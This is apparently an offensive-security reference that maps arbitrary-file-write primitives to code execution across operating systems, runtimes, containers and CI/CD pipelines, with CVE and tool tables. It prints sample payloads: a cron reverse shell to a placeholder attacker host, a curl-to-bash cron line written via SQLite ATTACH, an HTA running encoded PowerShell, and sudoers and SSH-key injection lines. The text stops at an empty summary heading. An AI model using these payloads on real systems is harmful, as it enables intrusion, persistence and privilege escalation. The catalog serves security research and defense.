# Arbitrary File Write → RCE Primitives: Cross-Platform Chain Taxonomy

> **Scope**: Given an arbitrary file write (AFW) primitive — the ability to write attacker-controlled content to an attacker-controlled path — what targets on the filesystem lead to code execution? This document catalogs every known AFW→RCE chain across operating systems, language runtimes, web servers, containers, and CI/CD systems.
>
> **Exclusion**: File upload vulnerabilities (the mechanism by which AFW is obtained) are out of scope. This taxonomy begins *after* the write primitive is established.

---

## Classification Structure

This taxonomy is organized along three axes:

**Axis 1 — Write Target (Primary Structure)**: The structural category of the filesystem target being written to. This determines *what* the attacker overwrites or creates. The main body of this document is structured by this axis.

**Axis 2 — Execution Trigger**: How and when the written file gets executed. This cross-cutting axis explains *when* the payload fires.

| Trigger Type | Description |
|---|---|
| **Immediate** | Execution happens as part of the current request/process (e.g., template cache, uWSGI auto-reload) |
| **On-Restart** | Requires process/service restart (e.g., Bootsnap cache, initializer files) |
| **Scheduled** | Fires on a time-based schedule (e.g., cron, Windows Task Scheduler) |
| **On-Login** | Triggers when a user logs in (e.g., shell profiles, LaunchAgents, Windows Startup) |
| **On-Invocation** | Fires when a specific command is run (e.g., git hooks, Makefile) |
| **On-Import** | Fires when a module/library is loaded by the runtime (e.g., .so hijack, .pyc overwrite) |
| **Passive/Persistent** | Provides ongoing access rather than code execution (e.g., SSH authorized_keys) |

**Axis 3 — Platform Scope**: Which OS/runtime/deployment the technique applies to.

| Platform | Abbreviation |
|---|---|
| Linux | LNX |
| Windows | WIN |
| macOS | MAC |
| Cross-platform | XPLAT |
| Container/Docker | CTR |
| Cloud/Serverless | CLD |
| CI/CD Pipeline | CICD |

---

## §1. OS-Level Scheduled Execution Targets

Targets that are periodically executed by the operating system's task scheduling subsystem.

### §1-1. Cron Jobs (LNX/MAC)

Cron is a time-based job scheduler that automatically executes commands at configured intervals. Writing to cron directories provides reliable, time-delayed code execution.

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **System crontab** | `/etc/crontab` | Append job line with schedule + command | Root write access; tolerates partial/dirty content |
| **Cron.d drop-in** | `/etc/cron.d/<name>` | Create new file with cron syntax | File must have correct format; user field required |
| **Per-user crontab** | `/var/spool/cron/crontabs/<user>` | Direct crontab file overwrite | Owned by target user; cron daemon reloads automatically |
| **Periodic directories** | `/etc/cron.hourly/`, `.daily/`, `.weekly/`, `.monthly/` | Drop executable script | File must be executable (chmod +x); run-parts executes them |

**Partial write tolerance**: Cron is notably tolerant of "dirty" file writes. Appending a valid cron line to an existing file — even one containing binary garbage — often succeeds because cron parsers skip malformed lines.

**Example payload**:
```
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
```

### §1-2. Systemd Timers & Service Units (LNX)

Systemd provides a modern alternative to cron with richer execution semantics.

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **Timer unit** | `/etc/systemd/system/<name>.timer` | Create timer + associated service unit | Requires `systemctl daemon-reload` or reboot |
| **Service unit** | `/etc/systemd/system/<name>.service` | ExecStart points to attacker payload | Requires service enable/start or reboot |
| **Override drop-in** | `/etc/systemd/system/<svc>.service.d/override.conf` | Override ExecStart of existing service | Existing service restarts trigger payload |
| **User units** | `~/.config/systemd/user/<name>.service` | Per-user service execution | No root needed; user-level systemd |

### §1-3. Windows Task Scheduler (WIN)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **Scheduled task XML** | `C:\Windows\System32\Tasks\<name>` | Create XML task definition | Requires elevated privileges for system-level |
| **Startup folder** | `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\` | Drop `.bat`, `.vbs`, `.hta`, or `.lnk` | Fires on next user login |
| **All Users startup** | `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartMenu\Programs\Startup\` | Same as above, affects all users | Requires write to ProgramData |

**HTA payload for startup folder** (bypasses some detection):
```html
<script language="VBScript">
Set shell = CreateObject("wscript.Shell")
shell.run "powershell -ep bypass -c IEX(...)"
Window.Close
</script>
```

### §1-4. macOS LaunchAgent / LaunchDaemon (MAC)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **User LaunchAgent** | `~/Library/LaunchAgents/<name>.plist` | Plist defines program to execute at login | No root needed; fires on user login |
| **System LaunchAgent** | `/Library/LaunchAgents/<name>.plist` | Plist for all users | Root write required |
| **LaunchDaemon** | `/Library/LaunchDaemons/<name>.plist` | System-level daemon, runs at boot as root | Root required; most privileged |

---

## §2. Shell & Login Profile Injection

Targets that execute when a user starts a shell session or logs in.

### §2-1. Unix Shell Profiles (LNX/MAC)

| Subtype | Target Path | Trigger | Key Condition |
|---|---|---|---|
| **Bash login profile** | `~/.bash_profile`, `~/.bash_login`, `~/.profile` | Login shell (SSH, console login) | First found file is used |
| **Bash RC** | `~/.bashrc` | Every interactive non-login shell | Most frequently triggered |
| **Zsh profile** | `~/.zshrc`, `~/.zprofile`, `~/.zlogin` | Zsh session start | macOS default since Catalina |
| **System-wide profile** | `/etc/profile`, `/etc/bash.bashrc`, `/etc/zsh/zshrc` | All users | Root write required |
| **Environment file** | `~/.pam_environment`, `/etc/environment` | PAM or login process reads | Variable injection only; limited to env vars |

**Partial write tolerance**: Shell profiles tolerate dirty writes — appending a command to a file containing binary data works if the shell encounters valid syntax on any line. Embedding payloads in image EXIF metadata (newline-separated) is a known technique:
```bash
exiftool -Comment=$'\nmalicious_command\n' uploaded_image.png
```

### §2-2. Windows Shell Profiles (WIN)

| Subtype | Target Path | Trigger | Key Condition |
|---|---|---|---|
| **PowerShell AllUsersAllHosts** | `$PSHOME\Profile.ps1` | Every PowerShell session for all users | Effective AMSI bypass vector |
| **PowerShell CurrentUser** | `$HOME\Documents\PowerShell\Microsoft.PowerShell_profile.ps1` | Current user's PS sessions | No admin needed |
| **cmd.exe AutoRun** | `HKLM\SOFTWARE\Microsoft\Command Processor\AutoRun` (registry) | Every cmd.exe launch | Registry write needed |

---

## §3. Web Server & Application Server Configuration

Targets that alter how the web server processes requests, enabling code execution through legitimate request handling.

### §3-1. Apache .htaccess (LNX/WIN/MAC)

`.htaccess` files are per-directory configuration overrides processed by Apache on every request to that directory.

| Subtype | Mechanism | Example |
|---|---|---|
| **Handler remapping** | Force non-PHP files to execute as PHP | `AddType application/x-httpd-php .txt` |
| **CGI enablement** | Enable CGI execution in upload directory | `Options +ExecCGI\nAddHandler cgi-script .cgi` |
| **auto_prepend_file** | Prepend attacker file to every PHP execution | `php_value auto_prepend_file /tmp/shell.php` |
| **auto_append_file** | Append attacker code to every PHP response | `php_value auto_append_file /tmp/shell.php` |
| **UTF-7 encoding bypass** | Circumvent content filters via charset change | `php_flag zend.multibyte 1` + `php_value zend.script_encoding "UTF-7"` |

### §3-2. Nginx Configuration (LNX)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **Include drop-in** | `/etc/nginx/conf.d/<name>.conf` | Add server block or location directive | Requires nginx reload/restart |
| **fastcgi_param injection** | Within included config | Set `PHP_VALUE` with `auto_prepend_file` | PHP-FPM must be backend |

### §3-3. uWSGI Configuration (LNX)

uWSGI's configuration parser supports "magic" operators that enable direct command execution from `.ini` files.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **@(exec://) directive** | `foo = @(exec://whoami)` executes commands during config parse | uWSGI reads the written config file |
| **@(http://) directive** | Fetches remote content into config value | Network egress available |
| **py-auto-reload trigger** | Writing any `.py` file triggers config reload within monitoring interval | `py-auto-reload` must be enabled (common in dev) |
| **Polymorphic PDF/image** | Embed `[uwsgi]` section + `@(exec://)` in EXIF metadata of valid image/PDF | uWSGI parses entire file looking for `[uwsgi]` marker |

**This is a particularly powerful "dirty write" vector**: because uWSGI scans the entire file for the `[uwsgi]` section marker, binary garbage before and after the payload is ignored. A valid PDF containing malicious `.ini` directives in its EXIF metadata will execute when uWSGI processes it.

### §3-4. Java Application Server (XPLAT)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **JSP webshell** | `<webroot>/*.jsp` | JSP compiled and executed on request | Write to web-accessible directory |
| **web.xml servlet mapping** | `WEB-INF/web.xml` | Register malicious servlet | Application restart may be needed |
| **context.xml** | `META-INF/context.xml` | Alter context configuration | Tomcat hot-deploys on change |
| **WAR deployment** | Tomcat `webapps/` or auto-deploy directory | Drop `.war` archive | Auto-deploy enabled (default in dev) |

### §3-5. IIS / ASP.NET Configuration (WIN)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **web.config** | Application root `web.config` | Add handler mappings, ISAPI filters | IIS processes on next request |
| **ASPX webshell** | `<webroot>/*.aspx` | Compiled and executed by ASP.NET | Write to web-accessible directory |
| **Global.asax** | Application root | Application-level event hooks | App pool recycle triggers load |

---

## §4. Language Runtime Import & Autoload Hijacking

Targets that exploit how programming language runtimes discover, load, and execute code modules.

### §4-1. Python (XPLAT)

Python's import system checks extensions in priority order: `.so`/`.pyd` → `.py` → `.pyc`. This creates multiple hijack opportunities.

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **Shared object injection** | `<module_dir>/<module>.cpython-3XX-<arch>.so` | `.so` files take highest import priority | Module must be imported in a new process after write |
| **Bytecode (.pyc) overwrite** | `__pycache__/<module>.cpython-3XX.pyc` | Replace compiled bytecode with malicious code object | Magic number + timestamp + source size must match exactly |
| **.pth file injection** | `<site-packages>/evil.pth` | Lines starting with `import` are executed at interpreter startup | Write to any site-packages directory |
| **Source (.py) overwrite** | `<site-packages>/<module>.py` or `<app>/<module>.py` | Direct source replacement | Module must be re-imported |
| **`__init__.py` creation** | Any directory on `sys.path` | Directory becomes a package; `__init__.py` executes on import | Directory must be on Python's search path |
| **Werkzeug reloader trigger** | Any `.py`/`.pyc`/`.zip` in monitored paths | Flask debug reloader restarts worker, re-importing all modules | Flask debug mode (`FLASK_DEBUG=1`) |
| **Gunicorn worker crash** | Write invalid data to loaded module | Worker crashes, master spawns new worker that re-imports | Gunicorn with preload disabled |

**Dirty write via .pth files**: This is the most permissive vector — `.pth` files require no header validation, no version matching, and execute automatically on any Python process startup:
```
import os; os.system('id > /tmp/pwned')
```

### §4-2. Ruby (XPLAT)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **Bootsnap cache overwrite** | `tmp/cache/bootsnap/compile-cache-iseq/<hash>` | Replace cached compiled Ruby with malicious bytecode | Cache key (FNV-1a hash) must be computed correctly; requires restart |
| **Initializer injection** | `config/initializers/<name>.rb` | Rails executes all `.rb` files in initializers/ at startup | App restart required |
| **Gemfile overwrite** | `Gemfile` | Add `gem` pointing to malicious source | Next `bundle install` or app restart |
| **tmp/restart.txt** | `tmp/restart.txt` | Touching this file triggers Puma server restart | Puma must be in use; chains with other techniques |
| **.ruby-version** | `.ruby-version` | Change Ruby version to one with known vulns | rbenv/rvm must be in use |

**Bootsnap cache exploitation** is the most researched Rails-specific vector. The cache file consists of a 64-byte header (containing version, platform hash, compile options, ruby revision, mtime, and size) followed by compiled Ruby instruction sequences. The attacker must compute the FNV-1a 64-bit hash of the target file path to determine the cache file location, then construct a valid header matching the deployment environment. Combined with writing to `tmp/restart.txt` to trigger Puma restart, this achieves RCE even in restricted Docker environments where only `tmp/` is writable.

### §4-3. Node.js (XPLAT)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **package.json overwrite** | `package.json` | Change `scripts.start` or `main` entry | Next `npm start` or process restart |
| **node_modules hijack** | `node_modules/<module>/index.js` | Overwrite commonly-required module | Module must be `require()`'d after write |
| **require cache invalidation** | Any `.js` module | Overwrite source; delete from `require.cache` | Explicit cache invalidation or new process |
| **.env file overwrite** | `.env` | Inject `NODE_OPTIONS=--require=./malicious.js` | dotenv or similar reads `.env` on startup |

### §4-4. PHP (XPLAT)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **php.ini override** | `php.ini`, `.user.ini` | Set `auto_prepend_file` or `auto_append_file` | PHP-FPM scans `.user.ini` periodically |
| **Composer autoload** | `vendor/autoload.php` or `vendor/composer/autoload_*.php` | Modify autoload registry | Next request loads modified autoloader |
| **PHP session file** | `/var/lib/php/sessions/sess_<PHPSESSID>` | Inject serialized object with gadget chain | Deserialization gadget must exist in app |
| **opcache overwrite** | Opcache file cache directory | Replace cached opcode with malicious version | `opcache.file_cache` must be configured |

**PHP session injection example** (requires deserialization gadget):
```
x|O:6:"Gadget":1:{s:7:"command";s:15:"id > /tmp/pwned";}
```

### §4-5. Java (XPLAT)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **Classpath JAR injection** | Any directory on classpath | Drop JAR with classes that override application classes | Class loading order must favor attacker JAR |
| **Endorsed/ext directory** | `$JAVA_HOME/jre/lib/ext/` | JVM loads all JARs in ext directory | JVM restart required; rare in modern Java |
| **Service provider config** | `META-INF/services/<interface>` | Java ServiceLoader discovers attacker implementation | Application uses ServiceLoader |

---

## §5. OS Credential & Authentication File Overwrite

Targets that grant direct access (shell, SSH, sudo) by manipulating authentication databases.

### §5-1. SSH Authorized Keys (LNX/MAC)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **User authorized_keys** | `~/.ssh/authorized_keys` | Append attacker's public key | SSH daemon running; key-based auth enabled |
| **Root authorized_keys** | `/root/.ssh/authorized_keys` | Direct root SSH access | Root login permitted (`PermitRootLogin yes`) |
| **SSH config override** | `/etc/ssh/sshd_config` | Enable root login, disable restrictions | sshd reload/restart required |

**Partial write tolerance**: `authorized_keys` is newline-delimited. Appending a valid key line to a file containing garbage works because OpenSSH ignores malformed lines. EXIF metadata injection is effective:
```bash
exiftool -Comment=$'\nssh-rsa AAAA... attacker@host\n' image.png
```

### §5-2. Unix Authentication Files (LNX)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **/etc/passwd** | `/etc/passwd` | Add user with UID 0 (no password: omit `x` field) | Root write; `nsswitch.conf` uses files |
| **/etc/shadow** | `/etc/shadow` | Replace root password hash | Root write; can also remove password entirely |
| **/etc/sudoers** | `/etc/sudoers` | Grant sudo access: `attacker ALL=(ALL) NOPASSWD:ALL` | Root write; syntax errors can lock out sudo |
| **sudoers.d drop-in** | `/etc/sudoers.d/<name>` | Same as above but safer (doesn't risk breaking main sudoers) | Root write; included by default |
| **PAM configuration** | `/etc/pam.d/<service>` | Add permissive auth module (`pam_permit.so`) | Root write; affects specific service |

### §5-3. Windows Credential Targets (WIN)

| Subtype | Target | Mechanism | Key Condition |
|---|---|---|---|
| **SAM database** | `C:\Windows\System32\config\SAM` | Offline password manipulation | Requires boot-time access or shadow copy |
| **Registry Run keys** | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Execute binary on user login | Registry write access |
| **RunOnce keys** | `HKLM\SOFTWARE\...\RunOnce` | One-time execution, then key deleted | Same as above |

---

## §6. Dynamic Linker & Library Hijacking

Targets that exploit the operating system's mechanism for discovering and loading shared libraries.

### §6-1. Linux Dynamic Linker (LNX)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **ld.so.preload** | `/etc/ld.so.preload` | Every dynamically linked binary loads specified `.so` before all others | Root write; most powerful Linux privesc primitive |
| **ld.so.conf** | `/etc/ld.so.conf` or `/etc/ld.so.conf.d/<name>.conf` | Add directory to library search path | Requires `ldconfig` to run (or reboot) |
| **LD_PRELOAD via profile** | `~/.bashrc` or `/etc/environment` | Set `LD_PRELOAD` environment variable | Target process must inherit env |
| **RPATH/RUNPATH hijack** | Binary's configured library search directory | Drop `.so` with same name as expected library | Binary must have writable RPATH dir |
| **modprobe_path overwrite** | `/proc/sys/kernel/modprobe` | Kernel executes specified binary when unknown binary format is `execve`'d | Requires kernel-level write primitive |

**`/etc/ld.so.preload`** is the single most powerful file write target on Linux — writing a path to a malicious `.so` file causes *every* dynamically-linked binary on the system to load the attacker's code, including SUID binaries running as root.

### §6-2. Windows DLL Hijacking (WIN)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Application directory DLL** | Drop DLL in same directory as target `.exe` | Application loads missing DLL from its directory |
| **System PATH DLL** | Drop DLL in writable directory on system PATH | DLL not found in app dir or System32 |
| **Phantom DLL** | Create DLL that application expects but doesn't exist | Application references non-existent DLL |
| **KnownDLLs bypass** | Target DLL not in `HKLM\SYSTEM\...\KnownDLLs` registry | KnownDLLs entries are loaded from System32 only |
| **WptsExtensions.dll** | `C:\Windows\System32\` | Task Scheduler loads this missing DLL at startup | Writable System32 (rare but exists in misconfigs) |
| **COM object InprocServer32** | `HKCU\Software\Classes\CLSID\{...}\InprocServer32` | HKCU takes priority over HKLM for COM resolution | No admin required; fires when COM object is instantiated |

**COM hijacking** deserves special attention: because `HKCU` COM registrations take priority over `HKLM`, a non-admin user can redirect any COM object to load a malicious DLL by writing to their own registry hive. This doesn't even require file write — just registry write — but in practice, AFW often grants both.

### §6-3. macOS dylib Hijacking (MAC)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **DYLD_INSERT_LIBRARIES** | Environment variable forces dylib loading | SIP-protected binaries are immune |
| **Weak dylib reference** | Application references dylib that doesn't exist | Must be in search path before legitimate |
| **LC_RPATH hijack** | Drop dylib in application's RPATH directory | RPATH directory must be writable |

---

## §7. Process-Level Memory & IPC Targets

Targets that enable code execution by writing to process memory, pipes, or file descriptors.

### §7-1. /proc Filesystem (LNX)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **/proc/self/mem** | `/proc/self/mem` | Overwrite function instructions in process memory with shellcode | Requires seek capability; parse `/proc/self/maps` for addresses |
| **/proc/PID/fd/N** | `/proc/<pid>/fd/<n>` | Write to open file descriptors (pipes, sockets) | Target process must have relevant fd open |
| **stdin injection** | `/proc/<pid>/fd/0` | Send commands to shell process via stdin | Target PID must be a shell (sh, bash) |
| **/proc/sys/kernel/core_pattern** | `/proc/sys/kernel/core_pattern` | Pipe core dumps to attacker binary: `\|/path/to/evil` | Root write; requires triggering a crash |

**`/proc/self/mem` shellcode injection**: This technique can succeed even when the process memory is marked non-writable — `/proc/self/mem` writes bypass mprotect restrictions. The attacker reads `/proc/self/maps` to find libc's base address, computes the offset of a commonly-called function (e.g., `__libc_write`), seeks to that address in `/proc/self/mem`, and overwrites with shellcode.

### §7-2. Named Pipes & Unix Sockets (LNX)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Named pipe injection** | Write commands to FIFO connected to shell process | Pipe must be writable; receiving process interprets input as commands |
| **Docker socket** | Write to `/var/run/docker.sock` | Container escape via Docker API | Socket must be mounted (common misconfiguration) |

---

## §8. Version Control & Development Tool Hooks

Targets that exploit hooks and configuration in development tools.

### §8-1. Git Hooks (XPLAT)

| Subtype | Target Path | Mechanism | Key Condition |
|---|---|---|---|
| **post-checkout** | `.git/hooks/post-checkout` | Executes after `git checkout`, `git clone` | File must be executable |
| **pre-commit** | `.git/hooks/pre-commit` | Executes before each `git commit` | Very frequently triggered |
| **post-merge** | `.git/hooks/post-merge` | Executes after `git merge`, `git pull` | Common developer workflow |
| **pre-push** | `.git/hooks/pre-push` | Executes before `git push` | Developer must push |
| **Submodule path symlink** | `.git/modules/<submodule>/hooks/` | Symlink tricks during recursive clone | CVE-2024-32002, CVE-2025-48384 |

Git hooks are executable scripts that Git runs automatically at specific lifecycle points. An AFW to `.git/hooks/` in a developer's repository provides persistent, stealthy code execution on every common git operation.

### §8-2. Build Tool Configuration (XPLAT)

| Subtype | Target File | Mechanism | Key Condition |
|---|---|---|---|
| **Makefile** | `Makefile` | Arbitrary shell commands in build targets | Next `make` invocation |
| **package.json scripts** | `package.json` | Overwrite `scripts.preinstall`, `scripts.build`, etc. | Next `npm install` or `npm run` |
| **setup.py / setup.cfg** | `setup.py` | Python code execution during package install | Next `pip install .` |
| **pyproject.toml** | `pyproject.toml` | Build system configuration with script hooks | Next build/install |
| **Gemfile** | `Gemfile` | Add gem with malicious source | Next `bundle install` |
| **.npmrc** | `.npmrc` | Redirect registry to attacker-controlled server | Next `npm install` |
| **Gradle build script** | `build.gradle` / `build.gradle.kts` | Arbitrary Groovy/Kotlin code execution | Next `gradle build` |
| **Maven POM** | `pom.xml` | Add plugin with exec-maven-plugin | Next `mvn` invocation |

### §8-3. IDE & Editor Configuration (XPLAT)

| Subtype | Target File | Mechanism | Key Condition |
|---|---|---|---|
| **VSCode tasks** | `.vscode/tasks.json` | Define tasks that execute on folder open | User must have auto-tasks enabled |
| **VSCode settings** | `.vscode/settings.json` | Set `terminal.integrated.shellArgs` or `python.pythonPath` | Indirect execution |
| **Vim modeline** | Any source file | Vim executes embedded modeline commands | `modeline` option enabled (default) |
| **JetBrains run config** | `.idea/runConfigurations/*.xml` | Pre-configured run/debug configurations | User runs the configuration |

---

## §9. CI/CD Pipeline Poisoning

Targets that achieve code execution within continuous integration / continuous delivery systems.

### §9-1. Pipeline Configuration Files (CICD)

| Subtype | Target File | Platform | Mechanism |
|---|---|---|---|
| **GitHub Actions** | `.github/workflows/<name>.yml` | GitHub | Define workflow with `run:` steps |
| **GitLab CI** | `.gitlab-ci.yml` | GitLab | Define job with `script:` blocks |
| **Jenkinsfile** | `Jenkinsfile` | Jenkins | Groovy script with `sh` steps |
| **CircleCI** | `.circleci/config.yml` | CircleCI | Define job commands |
| **Travis CI** | `.travis.yml` | Travis | Build lifecycle hooks |
| **Azure Pipelines** | `azure-pipelines.yml` | Azure DevOps | Task and script steps |
| **Dockerfile** | `Dockerfile` | Docker | `RUN` commands during build |
| **docker-compose.yml** | `docker-compose.yml` | Docker | Define services with command overrides |

### §9-2. Infrastructure-as-Code (CICD/CLD)

| Subtype | Target File | Mechanism | Key Condition |
|---|---|---|---|
| **Terraform config** | `*.tf` | `local-exec` / `remote-exec` provisioners | Next `terraform apply` |
| **Ansible playbook** | `*.yml` playbook | `shell`, `command`, `script` modules | Next `ansible-playbook` run (CVE-2024-40629) |
| **Helm chart** | `templates/*.yaml` | Container spec with command override | Next `helm install/upgrade` |
| **CloudFormation** | `template.yaml` | UserData scripts, Lambda code | Next stack deploy |

---

## §10. Container Escape & Cloud Primitives

Targets specific to containerized and cloud environments.

### §10-1. Container Escape via File Write (CTR)

| Subtype | Target | Mechanism | Key Condition |
|---|---|---|---|
| **Host mount overwrite** | Bind-mounted host directories | Write to host filesystem via shared mount | Volume mount must exist |
| **Docker socket access** | `/var/run/docker.sock` | Create privileged container on host | Socket mounted into container |
| **cgroup release_agent** | `/sys/fs/cgroup/*/release_agent` | Kernel executes specified program when cgroup empties | Privileged container or cgroup write access |
| **runc symlink attacks** | `/proc` entries via symlink race | Redirect runc writes to attacker-controlled path | CVE-2025-31133, CVE-2025-52565, CVE-2025-52881 |
| **SYS_PTRACE exploit** | `/proc/<host_pid>/mem` | Write to host process memory from container | `SYS_PTRACE` capability granted |

### §10-2. Cloud-Specific Targets (CLD)

| Subtype | Target | Mechanism | Key Condition |
|---|---|---|---|
| **Lambda /tmp persistence** | `/tmp/` in Lambda execution environment | Write payload; persists across warm invocations | Same execution environment reused |
| **Lambda layer overwrite** | Layer files in `/opt/` | Override runtime libraries in Lambda layer | Write access to /opt within function |
| **Cloud-init scripts** | `/var/lib/cloud/scripts/per-boot/` | Executes on every VM boot | Write to cloud-init directories |
| **Instance metadata proxy** | Credential files | Not direct RCE but enables lateral movement | Combined with other techniques |

---

## §11. Database & Serialization Targets

Targets that leverage database write capabilities or serialization mechanisms for code execution.

### §11-1. SQLite-Based Code Execution (XPLAT)

SQLite's `ATTACH DATABASE` allows writing structured data to arbitrary files, which can be combined with other execution mechanisms:

```sql
ATTACH DATABASE '/var/spool/cron/crontabs/root' AS pwn;
CREATE TABLE pwn.job (payload TEXT);
INSERT INTO pwn.job VALUES ('* * * * * root curl http://attacker/shell|bash');
```

This technique creates a valid cron file containing SQLite metadata (which cron ignores as malformed lines) and the attacker's cron entry.

### §11-2. Serialized Object Files (XPLAT)

| Subtype | Target | Mechanism | Key Condition |
|---|---|---|---|
| **PHP session files** | `/var/lib/php/sessions/sess_*` | Inject serialized object with gadget chain | Deserialization gadget exists in app |
| **Python pickle files** | Any `.pkl`/`.pickle` file loaded by app | `__reduce__` method executes arbitrary code | App loads attacker-controlled pickle |
| **Java serialized objects** | `.ser` files, RMI registry files | Gadget chain execution on deserialization | Vulnerable gadget in classpath |
| **YAML deserialization** | Config files loaded with unsafe YAML parser | `!!python/object/apply:os.system` or equivalent | `yaml.load()` without safe loader |

---

## §12. Browser & Desktop Application Configuration

Targets that exploit browser or desktop application configuration for indirect code execution.

### §12-1. Browser Configuration (XPLAT)

| Subtype | Target | Mechanism | Key Condition |
|---|---|---|---|
| **Chrome Preferences** | `~/.config/google-chrome/Default/Preferences` | Modify `session.startup_urls` to load attacker page | Browser restart |
| **Chrome extension** | Extension directory | Install malicious extension | Extension auto-loads on startup |
| **Firefox prefs.js** | `~/.mozilla/firefox/<profile>/prefs.js` | Set homepage, proxy, or extension path | Browser restart |
| **Widevine .so overwrite** | `_platform_specific/linux_x64/libwidevinecdm.so` | Replace DRM library with malicious .so | Chrome loads on DRM content request |

### §12-2. Desktop Application Configs (XPLAT)

| Subtype | Target | Mechanism | Key Condition |
|---|---|---|---|
| **XDG autostart** | `~/.config/autostart/<name>.desktop` | `.desktop` file with `Exec=` directive | LNX desktop environment; fires on login |
| **XDG MIME handler** | `~/.local/share/applications/mimeapps.list` | Redirect file type handling to attacker binary | User opens specific file type |
| **Windows file associations** | Registry or `HKCU\Software\Classes` | Redirect extension handler | User opens file with associated extension |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Most Effective Primitives |
|---|---|---|---|
| **Linux web server (root)** | Apache/Nginx + PHP/Python | §1-1, §3-1, §4-1, §5-2, §6-1 | `/etc/ld.so.preload` (§6-1), cron (§1-1) |
| **Linux web server (non-root)** | Containerized app | §2-1, §3-1, §4-1, §5-1, §8-1 | SSH keys (§5-1), .pth injection (§4-1) |
| **Dockerized Rails/Python** | Docker + Puma/Gunicorn | §4-1, §4-2, §3-3, §10-1 | Bootsnap cache (§4-2), .pth file (§4-1) |
| **Windows IIS server** | IIS + ASP.NET | §1-3, §3-5, §5-3, §6-2 | DLL hijack (§6-2), startup folder (§1-3) |
| **CI/CD runner** | GitHub Actions / Jenkins | §9-1, §8-2, §8-1 | Pipeline config (§9-1), git hooks (§8-1) |
| **Cloud Lambda/Function** | AWS/GCP serverless | §10-2, §4-1 | /tmp persistence (§10-2), layer overwrite |
| **Developer workstation** | macOS/Linux with IDE | §2-1, §8-1, §8-3, §1-4 | Git hooks (§8-1), shell profile (§2-1) |
| **Kubernetes pod** | K8s cluster | §10-1, §7-2, §1-1 | Host mount (§10-1), Docker socket (§7-2) |

---

## CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §3-4 JSP + path traversal | CVE-2017-12617 (Apache Tomcat) | RCE via PUT bypass; widely exploited |
| §4-2 Bootsnap cache | Conviso research 2024 (Rails) | RCE in restricted Docker Rails apps |
| §3-3 uWSGI `@(exec://)` | Doyensec 2023 research | Dirty AFW→RCE via polymorphic PDF |
| §4-1 Python .so injection | siunam 2024 research | Dirty AFW→RCE bypassing filename restrictions |
| §8-1 Git hooks via symlink | CVE-2024-32002 (Git) | RCE on `git clone --recursive` |
| §8-1 Git hooks via symlink | CVE-2025-48384 (Git) | RCE on clone; CISA KEV listed |
| §8-1 Git hooks via CR injection | CVE-2025-48385 (Git) | Post-checkout hook execution |
| §10-1 runc symlink race | CVE-2025-31133, CVE-2025-52565, CVE-2025-52881 (runc) | Container escape in Docker/K8s |
| §10-1 Docker Compose path traversal | CVE-2025-xxxxx (Docker Compose < 2.40.2) | CVSS 8.9; arbitrary host file write |
| §3-1 .htaccess + path traversal | CVE-2024-46986 (Camaleon CMS) | Authenticated AFW→RCE |
| §9-2 Ansible playbook write | CVE-2024-40629 (JumpServer) | RCE in Celery container as root |
| §4-3 node-tar symlink | CVE-2021-37701, CVE-2021-37712 (node-tar) | Arbitrary file write + code execution |
| §3-1 auto_prepend_file | Multiple WordPress plugin CVEs | PHP code execution via `.user.ini` |
| §6-2 WptsExtensions.dll | Task Scheduler DLL hijack (WIN) | SYSTEM privileges on reboot |
| §6-2 COM InprocServer32 | Multiple persistence cases | Non-admin code execution via HKCU |
| §1-3 Startup folder + HTA | Valve HackerOne report #583184 | SYSTEM-level arbitrary file write |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **Nuclei** (scanner) | Web-facing AFW detection | YAML templates with matchers for path traversal + file write |
| **Burp Suite** (proxy) | Web application AFW testing | Active scanning with traversal payloads |
| **LinPEAS** (enumeration) | Linux privesc via writable files | Enumerates writable cron, profile, config files |
| **WinPEAS** (enumeration) | Windows privesc via writable files | Checks DLL hijack paths, startup folders, registry |
| **Procmon** (monitoring) | Windows DLL load monitoring | Traces DLL search order for hijack opportunities |
| **pspy** (monitoring) | Linux process monitoring without root | Detects cron execution and process spawning |
| **PEASS-ng** (enumeration) | Cross-platform privilege escalation | Comprehensive writable target enumeration |
| **DLLSpy** (scanner) | Windows DLL hijack detection | Identifies hijackable DLLs in running processes |
| **python_dirty_arbitrary_file_write** (exploit) | Python .pyc overwrite | Generates malicious bytecode with correct headers |
| **rails_arb_file_write_bootsnap** (exploit) | Ruby Bootsnap cache | Generates cache files with correct FNV-1a hash |
| **Trivy** (scanner) | Container vulnerability scanning | Detects vulnerable runc versions, misconfigurations |
| **Falco** (runtime) | Container runtime security | Alerts on suspicious file writes in containers |

---

## Summary: Core Principles

